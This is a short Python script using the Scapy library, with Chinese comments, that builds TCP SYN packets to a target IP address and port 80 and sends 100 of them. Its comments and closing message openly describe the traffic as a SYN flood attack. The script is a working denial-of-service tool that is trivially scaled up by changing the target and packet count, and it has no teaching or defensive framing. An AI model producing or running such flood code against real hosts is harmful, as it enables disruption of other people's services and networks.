from scapy.all import *

# 定义目标IP地址和端口号
target_ip = "0.0.0.0"
target_port = 80

# 构造TCP SYN包
packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")

# 发送TCP SYN包
send(packet*100)  # 发送100个包作为攻击流量

print("TCP SYN Flood攻击包已发送至目标IP地址：", target_ip)
